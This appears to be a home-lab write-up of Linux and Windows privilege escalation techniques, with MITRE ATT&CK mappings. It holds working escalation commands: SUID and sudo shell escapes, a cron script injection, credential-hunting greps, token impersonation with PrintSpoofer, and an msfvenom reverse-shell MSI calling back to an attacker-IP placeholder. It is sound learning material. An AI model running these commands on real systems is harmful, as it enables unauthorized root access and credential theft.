# Privilege Escalation Lab — Linux & Windows

## Overview

This lab documents hands-on privilege escalation techniques practiced in an isolated home lab environment. The goal is to identify and exploit common misconfigurations on both Linux and Windows systems to escalate from a low-privilege user to root/SYSTEM.

All activity conducted in a controlled lab environment. No production systems were targeted.

---

## Lab Environment

| Component | Details |
|---|---|
| Attacker Machine | Kali Linux (VM) |
| Linux Target | Metasploitable 2 / Custom Ubuntu VM |
| Windows Target | Windows 10 (VM) |
| Network | Host-only isolated segment |
| Hypervisor | VirtualBox / VMware |

---

## Methodology

```
Enumeration → Identify Misconfigurations → Exploit → Verify Root/SYSTEM Access → Document
```

---

## Part 1 — Linux Privilege Escalation

### Step 1 — Manual Enumeration

After gaining initial low-privilege shell, enumerate the system manually:

```bash
# Current user and privileges
whoami
id
sudo -l

# OS and kernel version
uname -a
cat /etc/os-release

# Running processes
ps aux

# Network connections
netstat -tulnp

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# World-writable files
find / -writable -type f 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for stored credentials
cat /etc/passwd
cat ~/.bash_history
find / -name "*.conf" 2>/dev/null | xargs grep -i "password" 2>/dev/null
```

---

### Technique 1 — SUID Binary Abuse

**What it is:** SUID binaries run with the file owner's privileges (often root). If a misconfigured binary is present, it can be abused to spawn a root shell.

**Enumeration:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Example — `/usr/bin/find` with SUID set:**
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**Result:** Root shell obtained via misconfigured SUID binary.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

### Technique 2 — Sudo Misconfiguration

**What it is:** If a user can run a binary as root via `sudo` without a password, it can be exploited.

**Enumeration:**
```bash
sudo -l
```

**Example output:**
```
(ALL) NOPASSWD: /usr/bin/vim
```

**Exploit:**
```bash
sudo vim -c ':!/bin/sh'
```

**Result:** Root shell obtained via sudo vim.

**Reference:** [GTFOBins](https://gtfobins.github.io) — catalogue of Unix binaries that can be abused for privesc.

**MITRE ATT&CK:** T1548.003 — Sudo and Sudo Caching

---

### Technique 3 — Writable Cron Job

**What it is:** If a script run by root's cron job is world-writable, you can inject a reverse shell or privilege escalation payload.

**Enumeration:**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
find / -writable -name "*.sh" 2>/dev/null
```

**Exploit:**
```bash
echo 'chmod +s /bin/bash' >> /path/to/writable-cron-script.sh
# Wait for cron to run, then:
/bin/bash -p
```

**Result:** Root shell via injected cron payload.

**MITRE ATT&CK:** T1053.003 — Scheduled Task/Job: Cron

---

## Part 2 — Windows Privilege Escalation

### Step 1 — Manual Enumeration

```cmd
:: Current user
whoami
whoami /priv
whoami /groups

:: System info
systeminfo
hostname

:: Running services
sc query
tasklist /svc

:: Scheduled tasks
schtasks /query /fo LIST /v

:: Stored credentials
cmdkey /list

:: Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

:: AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

### Technique 1 — Unquoted Service Path

**What it is:** If a service binary path contains spaces and is not quoted, Windows will attempt to execute from each space-delimited path segment. An attacker can plant a malicious binary in an earlier path.

**Enumeration:**
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """
```

**Example vulnerable path:**
```
C:\Program Files\Vulnerable App\service.exe
```

**Exploit:** Place malicious `Program.exe` in `C:\` — Windows executes it when the service starts.

**MITRE ATT&CK:** T1574.009 — Hijack Execution Flow: Path Interception by Unquoted Path

---

### Technique 2 — AlwaysInstallElevated

**What it is:** If both registry keys are set to 1, any user can install `.msi` packages with SYSTEM privileges.

**Check:**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit — generate malicious MSI with msfvenom:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi -o exploit.msi
```

```cmd
msiexec /quiet /qn /i exploit.msi
```

**Result:** SYSTEM shell obtained.

**MITRE ATT&CK:** T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control

---

### Technique 3 — SeImpersonatePrivilege (Token Impersonation)

**What it is:** Service accounts often hold `SeImpersonatePrivilege`. Tools like PrintSpoofer or GodPotato can abuse this to impersonate the SYSTEM token.

**Check:**
```cmd
whoami /priv
```

**Look for:**
```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

**Exploit (PrintSpoofer):**
```cmd
PrintSpoofer.exe -i -c cmd
```

**Result:** SYSTEM shell via token impersonation.

**MITRE ATT&CK:** T1134.001 — Access Token Manipulation: Token Impersonation/Theft

---

## Tools Used

| Tool | Purpose |
|---|---|
| LinPEAS | Automated Linux enumeration |
| WinPEAS | Automated Windows enumeration |
| GTFOBins | Linux binary abuse reference |
| PrintSpoofer | Windows token impersonation |
| msfvenom | Payload generation |
| Kali Linux | Attacker platform |

---

## MITRE ATT&CK Summary

| Technique | ID |
|---|---|
| Abuse Elevation Control: Setuid/Setgid | T1548.001 |
| Sudo and Sudo Caching | T1548.003 |
| Scheduled Task/Job: Cron | T1053.003 |
| Path Interception: Unquoted Path | T1574.009 |
| Bypass UAC / AlwaysInstallElevated | T1548.002 |
| Access Token Manipulation | T1134.001 |

---

## Key Takeaways

- Manual enumeration always comes before automated tools — understand what you're looking for first
- SUID binaries and sudo misconfigurations are among the most common Linux privesc vectors
- Unquoted service paths and weak registry policies are frequently found in real Windows environments
- `SeImpersonatePrivilege` on a service account is almost always exploitable — patch or restrict it
- Always verify root/SYSTEM access and document every step with output

---

*All activity conducted in an isolated lab environment. No production systems were targeted.*
